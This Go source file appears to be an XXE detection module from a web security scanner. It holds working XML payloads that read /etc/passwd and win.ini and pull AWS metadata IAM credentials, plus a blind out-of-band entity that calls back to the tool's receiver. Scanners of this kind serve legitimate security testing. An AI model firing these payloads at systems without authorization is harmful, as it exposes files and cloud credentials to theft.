package core

import (
	"bytes"
	"context"
	"fmt"
	"net/http"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// XMLExternalEntityInjectionXxeResult holds the result of the XMLExternalEntityInjectionXxe module execution.
type XMLExternalEntityInjectionXxeResult struct {
	Target string `json:"target"`
	Status string `json:"status"`
	Detail string `json:"detail,omitempty"`
}

// XMLExternalEntityInjectionXxe executes the xml_external_entity_injection_xxe security technique.
type XMLExternalEntityInjectionXxe struct {
	BaseModule
	Target  string
	results []XMLExternalEntityInjectionXxeResult
	OOB     *OOBManager

	attemptedProbes int64
	failedProbes    int64
}

// NewXMLExternalEntityInjectionXxe creates a new instance.
func NewXMLExternalEntityInjectionXxe(target string) *XMLExternalEntityInjectionXxe {
	return &XMLExternalEntityInjectionXxe{
		BaseModule: BaseModule{
			Client:     NewHTTPClient(10 * time.Second),
			MaxThreads: 5,
		},
		Target: EnsureHTTPPrefix(target),
	}
}

func (m *XMLExternalEntityInjectionXxe) SetThreads(count int) {
	if count < 1 {
		count = 1
	}
	m.MaxThreads = count
}

var xxePayloads = []string{
	`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>`,
	`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]><root>&test;</root>`,
	`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]><foo>&xxe;</foo>`,
}

// xxeOOBPayloadTemplate is a blind-XXE parameter entity: when the parser
// resolves %remote, the OOB receiver logs the interaction even though no data
// is echoed back into the response. %%OOB_URL%% is substituted per run with
// the full payload URL returned by GenerateOOBPayload (already host/id shaped).
var xxeOOBPayloadTemplate = `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "%%OOB_URL%%">%remote;]><root>x</root>`

// xxeBaselineDoc is a benign document sent with the same method, path and
// content type as the payload requests, used to filter markers that already
// appear in ordinary responses (cloud metadata docs, config guides).
const xxeBaselineDoc = `<?xml version="1.0"?><root>probe</root>`

// xxeBodyContainsMarker reports whether a response body carries one of the
// signatures for successful LFI or SSRF via XXE.
func xxeBodyContainsMarker(body string) bool {
	return strings.Contains(body, "root:x:0:0:") ||
		strings.Contains(strings.ToLower(body), "[extensions]") ||
		strings.Contains(body, "ami-id") // AWS metadata indicator
}

// pollOOBHits waits up to 5s for an OOB callback with the given id.
func (m *XMLExternalEntityInjectionXxe) pollOOBHits(ctx context.Context, id string) []OOBHit {
	timeout := time.After(5 * time.Second)
	ticker := time.NewTicker(500 * time.Millisecond)
	defer ticker.Stop()
	for {
		select {
		case <-ctx.Done():
			return nil
		case <-timeout:
			return nil
		case <-ticker.C:
			if hits := m.OOB.Hits(id); len(hits) > 0 {
				return hits
			}
		}
	}
}

func (m *XMLExternalEntityInjectionXxe) Execute(ctx context.Context) ([]XMLExternalEntityInjectionXxeResult, error) {
	m.Mu.Lock()
	m.results = make([]XMLExternalEntityInjectionXxeResult, 0)
	m.Mu.Unlock()

	jobs := make(chan string, len(xxePayloads)+1)
	for _, p := range xxePayloads {
		jobs <- p
	}
	jobs <- xxeOOBPayloadTemplate
	close(jobs)

	var wg sync.WaitGroup

	for range m.MaxThreads {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for payloadTemplate := range jobs {
				select {
				case <-ctx.Done():
					return
				default:
					if strings.Contains(payloadTemplate, "%%OOB_URL%%") {
						if m.OOB == nil {
							continue
						}
						oobURL, oobID := m.OOB.GenerateOOBPayload()
						if oobURL == "" || oobID == "" {
							continue
						}
						if !strings.HasPrefix(oobURL, "http://") && !strings.HasPrefix(oobURL, "https://") {
							oobURL = "http://" + oobURL
						}
						payload := strings.ReplaceAll(payloadTemplate, "%%OOB_URL%%", oobURL)
						m.testPayload(ctx, payload, oobID)
					} else {
						m.testPayload(ctx, payloadTemplate, "")
					}
				}
			}
		}()
	}

	done := make(chan struct{})
	go func() {
		wg.Wait()
		close(done)
	}()

	select {
	case <-done:
		m.appendInconclusiveIfAllProbesFailed()
		return m.results, nil
	case <-ctx.Done():
		<-done
		m.appendInconclusiveIfAllProbesFailed()
		return m.results, ctx.Err()
	}
}

// appendInconclusiveIfAllProbesFailed emits an inconclusive summary row when
// every dispatched payload request failed, so an unreachable target is never
// reported as a clean scan.
func (m *XMLExternalEntityInjectionXxe) appendInconclusiveIfAllProbesFailed() {
	m.Mu.Lock()
	defer m.Mu.Unlock()
	if len(m.results) > 0 {
		return
	}
	attempted := atomic.LoadInt64(&m.attemptedProbes)
	if attempted > 0 && attempted == atomic.LoadInt64(&m.failedProbes) {
		m.results = append(m.results, XMLExternalEntityInjectionXxeResult{
			Target: m.Target,
			Status: statusFromEvidence(EvidenceWeak, false),
			Detail: formatEvidenceDetail(EvidenceWeak, "All XXE payload requests failed with transport errors or HTTP error responses; target reachability could not be established."),
		})
	}
}

func (m *XMLExternalEntityInjectionXxe) testPayload(ctx context.Context, payload string, oobID string) {
	atomic.AddInt64(&m.attemptedProbes, 1)

	req, err := http.NewRequestWithContext(ctx, "POST", m.Target, bytes.NewBuffer([]byte(payload)))
	if err != nil {
		atomic.AddInt64(&m.failedProbes, 1)
		return
	}
	req.Header.Set("Content-Type", "application/xml")

	resp, err := m.Client.Do(req)
	if err != nil {
		atomic.AddInt64(&m.failedProbes, 1)
		return
	}
	defer resp.Body.Close()

	// A 4xx/5xx response means the parser rejected the document outright, so it
	// counts as an unusable probe; judging still proceeds in case the error
	// body leaks marker content (results short-circuit the summary below).
	if resp.StatusCode >= http.StatusBadRequest {
		atomic.AddInt64(&m.failedProbes, 1)
	}

	bodyBytes, err := ReadBoundedBody(resp.Body, MaxResponseBodyBytes)
	if err != nil {
		atomic.AddInt64(&m.failedProbes, 1)
		return
	}
	bodyStr := string(bodyBytes)

	// Baseline POST with a benign document on the same path and content type:
	// a marker that already appears in the unmodified response (cloud metadata
	// docs, config documentation) is not proof of file/URL retrieval.
	baseReq, err := http.NewRequestWithContext(ctx, "POST", m.Target, bytes.NewBuffer([]byte(xxeBaselineDoc)))
	if err != nil {
		atomic.AddInt64(&m.failedProbes, 1)
		return
	}
	baseReq.Header.Set("Content-Type", "application/xml")

	baseResp, err := m.Client.Do(baseReq)
	if err != nil {
		atomic.AddInt64(&m.failedProbes, 1)
		return
	}
	baseBytes, err := ReadBoundedBody(baseResp.Body, MaxResponseBodyBytes)
	baseResp.Body.Close()
	if err != nil {
		atomic.AddInt64(&m.failedProbes, 1)
		return
	}
	baseStr := string(baseBytes)

	if oobID != "" && m.OOB != nil {
		if hits := m.pollOOBHits(ctx, oobID); len(hits) > 0 {
			for _, h := range hits {
				m.RecordPoC(req, nil, oobHitDescription(oobID, h))
			}
			// A callback is the confirming true condition against the
			// no-callback control: confirmed only when the interaction fired.
			if oobEvidenceTier(oobID, hits) == EvidenceConfirmed {
				m.Mu.Lock()
				summary := fmt.Sprintf("OOB interaction observed for XXE parameter entity (id: %s).", oobID)
				detail := formatEvidenceDetail(EvidenceConfirmed, summary)
				m.RecordPoC(req, nil, detail)
				m.results = append(m.results, XMLExternalEntityInjectionXxeResult{
					Target: m.Target,
					Status: statusFromEvidence(EvidenceConfirmed, false),
					Detail: detail,
				})
				m.Mu.Unlock()
			}
			return
		}
	}

	// Signatures for successful LFI or SSRF via XXE; the marker must be absent
	// from the benign baseline response before it counts.
	if xxeBodyContainsMarker(bodyStr) && !xxeBodyContainsMarker(baseStr) {
		m.Mu.Lock()
		summary := "XXE vulnerability detected. Sensitive data retrieved."
		detail := formatEvidenceDetail(EvidenceConfirmed, summary)
		m.RecordPoC(req, nil, detail)
		m.results = append(m.results, XMLExternalEntityInjectionXxeResult{
			Target: m.Target,
			Status: statusFromEvidence(EvidenceConfirmed, false),
			Detail: detail,
		})
		m.Mu.Unlock()
	}
}

func init() {
	RegisterModule("xml_external_entity_injection_xxe", func(payload map[string]any, onLog func(string)) (ExecutableModule, error) {

		target := PayloadString(payload, "url", "")
		onLog(fmt.Sprintf("Starting XMLExternalEntityInjectionXxe on: %s", target))

		tester := NewXMLExternalEntityInjectionXxe(target)

		return ModuleWrapper{
			Module: tester,
			ExecuteFunc: func(ctx context.Context) (any, error) {
				oob := &OOBManager{PublicHost: PayloadString(payload, "oob_host", "127.0.0.1")}
				if err := oob.StartOOBReceiver("127.0.0.1:0"); err == nil {
					onLog(fmt.Sprintf("OOB Receiver started on %s", oob.Listener.Addr().String()))
					tester.OOB = oob
					defer oob.StopOOBReceiver()
				} else {
					onLog(fmt.Sprintf("Warning: Failed to start OOB Receiver: %v. Proceeding with in-band only.", err))
				}
				return tester.Execute(ctx)
			},
		}, nil
	})
}
